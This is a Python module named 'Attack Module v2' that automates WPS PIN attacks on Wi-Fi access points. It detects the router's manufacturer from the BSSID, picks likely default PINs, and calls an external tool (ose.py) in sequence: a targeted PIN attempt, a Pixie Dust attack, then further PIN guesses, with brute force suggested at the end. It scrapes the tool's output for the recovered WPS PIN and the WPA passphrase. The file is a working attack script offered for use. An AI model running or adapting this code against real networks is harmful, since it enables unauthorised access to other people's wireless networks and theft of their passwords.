#!/usr/bin/env python3
"""
Attack Module v2 - Smart PIN selection
Uses wps_pins.py to find the best PIN first
"""

import re
import sys
import subprocess
from datetime import datetime
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from modules.wps_pins import suggest_pins, get_best_pin, detect_manufacturer

LOGS_DIR = Path(__file__).parent.parent / "logs"

NOISE_PATTERNS = [
    "nl80211:", "ioctl[", "EAPOL:", "wpa_driver_wext",
    "RTM_NEWLINK", "vendor command", "vendor event",
    "wlan0:", "wpa_supplicant", "Successfully",
    "CTRL-EVENT", "nl80211: Supported", "nl80211: key_mgmt",
    "nl80211: P2P", "nl80211: Use sep", "nl80211: Enable",
    "nl80211: STATION", "nl80211: AP sup", "nl80211: probe",
    "nl80211: Set mode", "nl80211: Failed", "nl80211: Try mode",
    "nl80211: Interf", "nl80211: Could", "nl80211: deinit",
    "nl80211: Remove", "nl80211: Add in", "nl80211: Own MAC",
    "nl80211: interface", "nl80211: Using driver",
    "nl80211: Connect", "nl80211: Associate", "nl80211: Oper",
    "ENGINE:", "TDLS:", "MBO:", "netlink:", "WEXT:",
    "rfkill:", "ctrl_interface", "cipher 00", "key_mgmt=0x",
    "probe_resp", "Using driver", "Reading con",
    "wlan0: Own", "wlan0: Added", "wlan0: State",
    "wlan0: Control", "wlan0: Setting", "wlan0: Start",
    "wlan0: Radio", "wlan0: CTRL", "wlan0: RSN",
    "EAPOL:", "EAP: ", "Add interface", "RTM_NEWLINK,",
    "WEXT: if_", "nl80211: Drv", "nl80211: Conn",
    "nl80211: Assoc", "nl80211: Oper",
    "P2P:", "TDLS:", "EAPOL:", "EAP:",
    "wlan0: Determining", "wlan0: Shared",
    "wlan0: freq=", "wlan0: WPA:", "wlan0: Associated to",
    "WPS: UUID", "WPS: PIN", "WPS: Add auth", "WPS: Authorized",
    "WPS: Internal", "WPS: wps_cb", "WPS: Selected",
    "WPS: A new PIN", "WPS: Prefer PSK",
    "WPS: Processing", "WPS: Received WSC_MSG",
    "WPS: UUID-E", "WPS: Enrollee",
    "EAP-WSC:", "EAP: Initialize", "EAP: Status",
    "l2_packet", "TX EAPOL",
]


def analyze_target(bssid, wps_version="", wps_locked="Unknown"):
    """Analyze target and return smart PIN suggestions"""
    manufacturer, algo, confidence = detect_manufacturer(bssid)
    pins = suggest_pins(bssid, wps_version, wps_locked)

    analysis = {
        "bssid": bssid,
        "manufacturer": manufacturer or "Unknown",
        "algorithm": algo or "generic",
        "confidence": confidence,
        "pins": pins[:10],
        "best_pin": pins[0]["pin"] if pins else "12345670",
        "total_pins": len(pins),
    }

    return analysis


def run_ose(ose_path, interface, attack_type, bssid=None, pin=None, callback=None):
    """Run ose.py attack with smart PIN selection"""

    # Smart PIN selection for PIN attack
    if attack_type == "pin" and not pin:
        analysis = analyze_target(bssid)
        pin = analysis["best_pin"]
        if callback:
            callback("[*] Smart PIN selected: " + pin +
                     " (" + analysis["pins"][0]["method"] + ")")

    # Build command
    cmd = [sys.executable, ose_path, "-i", interface, "-D"]

    if bssid:
        cmd.extend(["-b", bssid])

    if attack_type == "pixie":
        cmd.append("--pixie-dust")
        cmd.append("--show-pixie")
    elif attack_type == "bruteforce":
        cmd.append("--bruteforce")
    elif attack_type == "pin" and pin:
        cmd.extend(["-p", pin])
    elif attack_type == "pbc":
        cmd.append("--pbc")
    elif attack_type == "smart":
        # Smart mode: try best PIN first, then pixie, then brute
        analysis = analyze_target(bssid)
        best_pin = analysis["best_pin"]
        cmd.extend(["-p", best_pin])
        if callback:
            callback("[*] Smart mode: trying PIN " + best_pin)
    elif attack_type == "interactive":
        pass

    found_pin = None
    found_psk = None
    output_lines = []

    log_file = LOGS_DIR / f"attack_{datetime.now():%Y%m%d_%H%M%S}.log"

    try:
        proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True, bufsize=1
        )

        with open(log_file, "w") as f:
            for line in iter(proc.stdout.readline, ""):
                line = line.rstrip("\n")
                f.write(line + "\n")
                f.flush()

                skip = False
                for pat in NOISE_PATTERNS:
                    if pat in line:
                        skip = True
                        break
                if skip or not line.strip():
                    continue

                output_lines.append(line)
                ll = line.lower()

                if "wps pin:" in ll:
                    m = re.search(r"(\d{8})", line)
                    if m:
                        found_pin = m.group(1)

                if "wpa psk:" in ll or "network key:" in ll:
                    m = re.search(r"[:\s]([a-zA-Z0-9!@#$%^&*_\-]{8,})", line)
                    if m:
                        found_psk = m.group(1)

                if callback:
                    callback(line)

        proc.wait()

    except KeyboardInterrupt:
        try:
            proc.terminate()
            proc.wait(timeout=5)
        except Exception:
            try:
                proc.kill()
            except Exception:
                pass
    except FileNotFoundError:
        if callback:
            callback("[!] ose.py not found: " + ose_path)
    except Exception as e:
        if callback:
            callback("[!] Error: " + str(e))

    status = "success" if (found_pin and found_psk) else (
        "pin_found" if found_pin else "completed"
    )

    return {
        "pin": found_pin,
        "psk": found_psk,
        "status": status,
        "output": "\n".join(output_lines),
        "log_file": str(log_file),
    }


def run_smart_attack(ose_path, interface, bssid, wps_version="",
                     wps_locked="Unknown", callback=None):
    """
    Smart attack sequence:
    1. Try best algorithm PIN first
    2. If locked → wait and retry
    3. Try Pixie Dust
    4. Fall back to brute force
    """

    analysis = analyze_target(bssid, wps_version, wps_locked)

    if callback:
        callback("\n" + "=" * 50)
        callback("SMART ATTACK ANALYSIS")
        callback("=" * 50)
        callback("Target:   " + bssid)
        callback("MFR:      " + str(analysis["manufacturer"]))
        callback("Algorithm:" + str(analysis["algorithm"]))
        callback("Best PIN: " + str(analysis["best_pin"]))
        callback("Confidence: " + str(analysis["confidence"]) + "%")
        callback("=" * 50)

    # Step 1: Try best PIN
    best_pin = analysis["best_pin"]
    if callback:
        callback("\n[*] Step 1: Trying best PIN: " + best_pin)

    result = run_ose(ose_path, interface, "pin", bssid, best_pin, callback)

    if result["status"] == "success":
        return result

    # Step 2: Try Pixie Dust
    if callback:
        callback("\n[*] Step 2: Trying Pixie Dust...")

    result = run_ose(ose_path, interface, "pixie", bssid, None, callback)

    if result["status"] == "success":
        return result

    # Step 3: Try top 3 algorithm PINs
    for i, pin_info in enumerate(analysis["pins"][:3], 1):
        if pin_info["pin"] == best_pin:
            continue  # Already tried
        if callback:
            callback(f"\n[*] Step 3.{i}: Trying {pin_info['pin']} ({pin_info['method']})")
        result = run_ose(ose_path, interface, "pin", bssid, pin_info["pin"], callback)
        if result["status"] == "success":
            return result

    if callback:
        callback("\n[*] Smart attack completed. No credentials found.")
        callback("[*] Consider brute force (-B) for exhaustive search.")

    return result
